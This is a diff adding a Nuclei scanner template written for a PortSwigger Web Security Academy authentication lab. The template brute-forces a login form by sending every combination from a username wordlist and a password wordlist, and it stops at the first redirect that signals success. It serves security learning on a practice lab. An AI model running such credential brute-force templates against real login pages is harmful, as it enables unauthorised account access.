@@ -1,0 +1,31 @@
+id: 1_lab_auth_portswigger
+
+info:
+  name: Username enumeration via different responses
+  author: XI
+  severity: critical
+  description: Username enumeration via different responses, first portswigger auth lab
+  reference: https://XI
+  tags: portswigger, learn, nuclei, auth
+
+http:
+  - raw:
+    - |
+      POST /login HTTP/2 
+      Host: 0a5000ce030487cb80a5b70b00310041.web-security-academy.net
+      Content-Type: application/x-www-form-urlencoded
+
+      username={{username}}&password={{password}}
+
+    payloads:
+      username: ./usernames.txt
+      password: ./passwords.txt
+    
+    cookie-reuse: true
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 302
+      
+    attack: clusterbomb
